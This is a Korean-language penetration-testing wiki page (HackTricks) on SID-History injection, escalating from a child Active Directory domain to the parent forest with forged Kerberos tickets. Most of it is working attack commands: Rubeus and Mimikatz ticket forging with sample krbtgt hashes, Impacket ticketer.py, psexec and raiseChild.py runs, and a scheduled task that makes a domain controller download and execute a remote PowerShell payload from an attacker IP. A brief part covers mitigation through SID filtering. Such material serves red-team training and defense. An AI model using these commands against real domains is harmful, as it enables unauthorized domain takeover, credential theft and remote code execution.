# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack**의 목적은 **도메인 간 user migration**을 지원하면서 이전 도메인의 리소스에 대한 지속적인 access를 보장하는 것입니다. 이는 user의 이전 Security Identifier (SID)를 새 account의 SID History에 **추가**하여 수행됩니다. 특히 이 프로세스를 악용하면 parent domain의 높은 privilege를 가진 group(예: Enterprise Admins 또는 Domain Admins)의 SID를 SID History에 추가하여 unauthorized access를 부여할 수 있습니다. 이 exploitation을 통해 parent domain 내 모든 리소스에 access할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

이 attack을 실행하는 방법은 **Golden Ticket** 또는 **Diamond Ticket**을 생성하는 두 가지가 있습니다.

**"Enterprise Admins"** group의 SID를 확인하려면 먼저 root domain의 SID를 찾아야 합니다. 그런 다음 root domain의 SID 끝에 `-519`를 추가하여 Enterprise Admins group SID를 구성할 수 있습니다. 예를 들어 root domain의 SID가 `S-1-5-21-280534878-1496970234-700767426`이라면, "Enterprise Admins" group의 SID는 `S-1-5-21-280534878-1496970234-700767426-519`가 됩니다.<sup>[[1]](#references)</sup>

**Domain Admins** groups도 사용할 수 있으며, SID는 **512**로 끝납니다.

다른 domain에 있는 group(예: "Domain Admins")의 SID를 찾는 또 다른 방법은 다음과 같습니다:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> trust relationship에서 SID history를 비활성화할 수 있으며, 이 경우 이 attack은 실패합니다.

[**docs**](https://technet.microsoft.com/library/cc835085.aspx)에 따르면:<sup>[[3]](#references)</sup>
- netdom tool을 사용하여 **forest trusts에서 SIDHistory 비활성화** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- netdom tool을 사용하여 **external trusts에 SID Filter Quarantining 적용** (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **단일 forest 내 domain trusts에 SID Filtering 적용**하는 것은 지원되지 않는 configuration이며 breaking changes를 일으킬 수 있으므로 권장되지 않습니다. forest 내 domain이 신뢰할 수 없다면 해당 domain은 forest의 member가 아니어야 합니다. 이 경우 먼저 신뢰할 수 있는 domain과 신뢰할 수 없는 domain을 별도의 forest로 분리한 다음, SID Filtering을 interforest trust에 적용해야 합니다.

이를 우회하는 방법에 대한 자세한 내용은 다음 post를 참고하세요: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

마지막으로 이 작업을 시도했을 때는 **`/ldap`** arg를 추가해야 했습니다.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### KRBTGT-AES256을 사용한 Golden Ticket (Mimikatz)
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Golden Tickets에 대한 자세한 정보는 다음을 확인하세요:


{{#ref}}
golden-ticket.md
{{#endref}}


Diamond Tickets에 대한 자세한 정보는 다음을 확인하세요:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
손상된 도메인의 KRBTGT hash를 사용하여 root 또는 Enterprise admin의 DA로 권한 상승:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
공격을 통해 획득한 권한으로 새 도메인에서 예를 들어 DCSync attack을 실행할 수 있습니다:


{{#ref}}
dcsync.md
{{#endref}}

### Linux에서

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)를 사용한 수동 방법
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)를 사용한 자동화

이는 **child 도메인에서 parent 도메인으로 권한 상승을 자동화**하는 Impacket 스크립트입니다. 스크립트에는 다음이 필요합니다:

- 대상 Domain Controller
- child 도메인의 관리자 사용자 자격 증명

실행 흐름은 다음과 같습니다:

- parent 도메인의 Enterprise Admins 그룹 SID 획득
- child 도메인의 KRBTGT 계정 해시 검색
- Golden Ticket 생성
- parent 도메인에 로그인
- parent 도메인의 Administrator 계정 자격 증명 검색
- `target-exec` switch가 지정된 경우, Psexec를 통해 parent 도메인의 Domain Controller에 인증합니다.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 참고 자료

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Security Identifier (SID)란? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Trust에 대한 보안 고려 사항 - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - 도메인 간 보안 경계로서의 Sid Filter 4부](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
